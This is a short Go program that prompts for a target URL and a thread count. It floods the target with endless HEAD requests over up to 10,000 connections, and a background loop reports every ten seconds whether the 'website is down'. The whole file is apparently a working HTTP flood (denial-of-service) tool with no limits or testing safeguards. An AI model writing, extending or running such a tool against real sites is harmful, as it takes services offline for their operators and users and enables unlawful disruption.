package main

import (
	"fmt"
	"sync"
	"bufio"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

var errorLock = sync.Mutex{}
var lastError string
var lastErrorTime time.Time

func printError(errMsg string) {
	errorLock.Lock()
	defer errorLock.Unlock()
	now := time.Now()
	if errMsg != lastError || now.Sub(lastErrorTime) > 5*time.Second {
		fmt.Println(errMsg)
		lastError = errMsg
		lastErrorTime = now
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter URL: ")
	urlBytes, _, _ := reader.ReadLine()
	url := string(urlBytes)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	var wg sync.WaitGroup
	wg.Add(numThreads)

	client := &fasthttp.Client{
		MaxIdleConnDuration: 10 * time.Second,
		ReadTimeout:         10 * time.Second,
		WriteTimeout:        10 * time.Second,
		MaxConnsPerHost:     10000,
	}

	for i := 0; i < numThreads; i++ {
		go func() {
			defer wg.Done()
			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			defer func() {
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(resp)
			}()

			req.Header.SetMethod("HEAD")
			req.SetRequestURI(url)

			for {
				err := client.Do(req, resp)
				if err != nil {
					printError(err.Error())
					return
				}
			}
		}()
	}

go func() {
	reqStatus := fasthttp.AcquireRequest()
	respStatus := fasthttp.AcquireResponse()
	defer func() {
		fasthttp.ReleaseRequest(reqStatus)
		fasthttp.ReleaseResponse(respStatus)
	}()

	reqStatus.Header.SetMethod("GET")
	reqStatus.SetRequestURI(url)

	for {
		time.Sleep(10 * time.Second)
		start := time.Now()
		err := client.Do(reqStatus, respStatus)
		duration := time.Since(start)
		if err != nil {
			fmt.Println("Website is down")
		} else {
			fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
		}
	}
}()

	wg.Wait()
}
